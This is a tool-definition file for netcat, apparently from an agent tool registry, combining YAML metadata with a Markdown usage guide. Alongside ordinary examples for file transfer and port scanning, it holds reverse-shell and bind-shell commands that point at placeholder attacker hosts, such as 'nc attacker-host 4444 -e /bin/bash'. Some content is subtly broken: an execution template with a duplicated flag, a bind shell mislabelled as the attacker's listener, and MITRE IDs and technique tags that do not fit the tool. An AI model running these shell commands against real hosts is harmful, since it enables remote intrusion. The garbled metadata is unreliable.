---
id: network-socket-nc
namespace: network:socket:nc
name: netcat
description: Versatile networking utility for reading/writing data across TCP and
  UDP connections, port scanning, and network debugging.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.socket.listen
  - network.socket.connect
  - network.socket.transfer
  - network.scan.port
  - network.proxy.relay
  - network.diagnostic.banner
platforms:
  - linux
  - macos
  - cross-platform
risk_level: medium
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - telnet
  - nmap
  - socat
  - ncat
  - network-socket-socat
artifacts:
  - type: network.socket.data
    description: Data transferred over network connection
    mime: text/plain
    trust_level: verified
  - type: network.socket.banner
    description: Service banner received from remote host
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - network-data
    - service-banner
  consumes:
    - target-host
    - listen-port
contract:
  inputs:
    - type: network.target.host
      description: Target host to connect to
    - type: network.port
      description: Port number for connection or listening
  outputs:
    - type: network.socket.data
      description: Data received over the network connection
      mime: text/plain
  side_effects:
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - nc
  - netcat
  - ncat
  - Bash
  - execFile
parameters:
  - name: flag-c
    type: string
    required: false
    description: "as `-e'; use /bin/sh to exec [dangerous!!]"
    aliases:
      - -c
  - name: flag-e
    type: string
    required: false
    description: "program to exec after connect [dangerous!!]"
    aliases:
      - -e
  - name: flag-b
    type: string
    required: false
    description: "allow broadcasts"
    aliases:
      - -b
  - name: flag-g
    type: string
    required: false
    description: "source-routing hop point[s], up to 8"
    aliases:
      - -g
  - name: flag-G
    template_key: flag-g
    type: string
    required: false
    description: "source-routing pointer: 4, 8, 12"
    aliases:
      - -G
  - name: flag-h
    type: string
    required: false
    description: "this cruft"
    aliases:
      - -h
  - name: flag-i
    type: number
    required: false
    description: "delay interval for lines sent, ports scanned"
    aliases:
      - -i
  - name: flag-k
    type: string
    required: false
    description: "set keepalive option on socket"
    aliases:
      - -k
  - name: flag-l
    type: string
    required: false
    description: "listen mode, for inbound connects"
    aliases:
      - -l
  - name: flag-n
    type: integer
    required: false
    description: "numeric-only IP addresses, no DNS"
    aliases:
      - -n
  - name: flag-o
    type: string
    required: false
    description: "hex dump of traffic"
    aliases:
      - -o
  - name: flag-p
    type: integer
    required: false
    description: "local port number"
    aliases:
      - -p
  - name: flag-r
    type: string
    required: false
    description: "randomize local and remote ports"
    aliases:
      - -r
  - name: flag-q
    type: string
    required: false
    description: "quit after EOF on stdin and delay of secs"
    aliases:
      - -q
  - name: flag-s
    type: string
    required: false
    description: "local source address"
    aliases:
      - -s
  - name: flag-T
    template_key: flag-t
    type: string
    required: false
    description: "set Type Of Service"
    aliases:
      - -T
  - name: flag-t
    type: string
    required: false
    description: "answer TELNET negotiation"
    aliases:
      - -t
  - name: flag-u
    type: string
    required: false
    description: "UDP mode"
    aliases:
      - -u
  - name: flag-v
    type: string
    required: false
    description: "verbose [use twice to be more verbose]"
    aliases:
      - -v
  - name: flag-w
    type: number
    required: false
    description: "timeout for connects and final net reads"
    aliases:
      - -w
  - name: flag-z
    type: string
    required: false
    description: "zero-I/O mode [used for scanning]"
    aliases:
      - -z
execution:
  template: "netcat {flag-c} {flag-e} {flag-b} {flag-g} {flag-g}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars:
  target: ip
  port: port
examples:
  - description: "Connect to a remote service"
    command: "nc example.com 80"
  - description: "Listen for incoming connections on a port"
    command: "nc -l -p 8080"
  - description: "Transfer a file between machines (receiving)"
    command: "nc -l -p 1234 > received_file.txt"
  - description: "Transfer a file between machines (sending)"
    command: "cat file.txt | nc receiver-host 1234"
  - description: "Port scan a range"
    command: "nc -zv 192.168.1.1 20-100"
  - description: "Grab service banner"
    command: "echo '' | nc -w 3 example.com 22"
  - description: NetRunners revshell/shell
    command: nc.exe {{IP}} {{PORT}} -e cmd
  - description: NetRunners revshell/shell
    command: nc -e /bin/bash {{IP}} {{PORT}}
  - description: Basic client use - connect to a server
    command: nc [hostname] [port]
  - description: Basic server use - listen on a specific port
    command: nc -l -p [port]
  - description: Send a file from a client to a server Server side
    command: nc -l -p [port] > [output-file]
  - description: Client side
    command: nc [hostname] [port] < [input-file]
  - description: Create a simple chat server Server side
    command: nc -l -p [port]
  - description: Client side
    command: nc [hostname] [port]
  - description: Port scanning a host for open ports
    command: nc -zv [hostname] [starting-port]-[ending-port]
  - description: Using UDP instead of TCP
    command: nc -u [hostname] [port]
  - description: Use with a timeout setting
    command: nc -w [timeout-in-seconds] [hostname] [port]
  - description: Listen for connections on multiple interfaces
    command: nc -l -p [port] -k
  - description: Establish a reverse shell (use with caution) Attacker machine - listen
      for incoming connections
    command: nc -l -p [port]
  - description: Victim machine - connect to attacker
    command: nc [attacker-ip] [port] -e /bin/bash
  - description: Start a simple TCP server on a specified port
    command: nc -l -p PORT_NUMBER
  - description: Connect to a TCP server on a specified IP address and port
    command: nc IP_ADDRESS PORT_NUMBER
  - description: Transfer a file from a server to a client On the server side (listening
      and sending the file)
    command: nc -l -p PORT_NUMBER < filename
  - description: On the client side (receiving the file)
    command: nc IP_ADDRESS PORT_NUMBER > filename
  - description: Scan open ports on a target host
    command: nc -zv IP_ADDRESS PORT_RANGE
  - description: Use netcat as a simple chat tool On one machine (listening)
    command: nc -l -p PORT_NUMBER
  - description: On another machine (connecting to the listener)
    command: nc IP_ADDRESS PORT_NUMBER
  - description: Create a reverse shell from a client to a server On the attacker's
      machine (listening)
    command: nc -l -p PORT_NUMBER -e /bin/bash
  - description: On the victim's machine (connecting back to the attacker's machine)
    command: nc IP_ADDRESS PORT_NUMBER -e /bin/bash
  - description: Bind shell on the server side On the server machine (listening and
      attaching a shell)
    command: nc -l -p PORT_NUMBER -e /bin/bash
  - description: On the client machine (connecting to the bind shell)
    command: nc IP_ADDRESS PORT_NUMBER
references:
  - label: "Netcat man page"
    url: "https://linux.die.net/man/1/nc"
  - label: "Netcat for beginners"
    url: "https://www.digitalocean.com/community/tutorials/netcat-commands"
techniques:
  - command-and-control
  - credential-access
  - defense-evasion
  - execution
  - lateral-movement
  - persistence
  - privilege-escalation
  - process-manip
mitre_ids:
  - T1035
  - T1140
  - T1187
  - T1197
  - T1208
install:
    - method: apt
      package_name: "netcat-openbsd"
      commands:
        - "apt-get install -y netcat-openbsd"
---

# Netcat — TCP/IP Swiss Army Knife

Netcat (nc) is one of the most versatile networking tools available. It can create TCP/UDP connections, listen for incoming connections, transfer files, scan ports, and act as a simple proxy or relay.

## Common Use Cases

### File Transfer

```bash
# Receiver (listen)
nc -l -p 1234 > received_file.zip

# Sender
cat file.zip | nc 192.168.1.100 1234
```

### Simple Web Request

```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

### Port Scanning

```bash
# Verbose scan of common ports
nc -zv 192.168.1.1 22 80 443 8080

# Port range scan
nc -zv 192.168.1.1 1-1024
```

### Reverse Shell (Security Testing)

```bash
# On attacker machine (listen)
nc -l -p 4444

# On target machine (connect back)
nc attacker-host 4444 -e /bin/bash
```

## Security Considerations

- Netcat with `-e` (execute) is dangerous — pipe to shell instead
- Unencrypted — use `ncat --ssl` or SSH tunneling for sensitive data
- Consider socat for more complex relay/proxy scenarios

## Related Tools

- **[socat](../../socket/socat.md)** — More advanced socket relay with SSL support
- **[nmap](../../recon/nmap.md)** — Professional port scanning with service detection
- **[ncat](../../socket/ncat.md)** — Modern netcat implementation from Nmap project
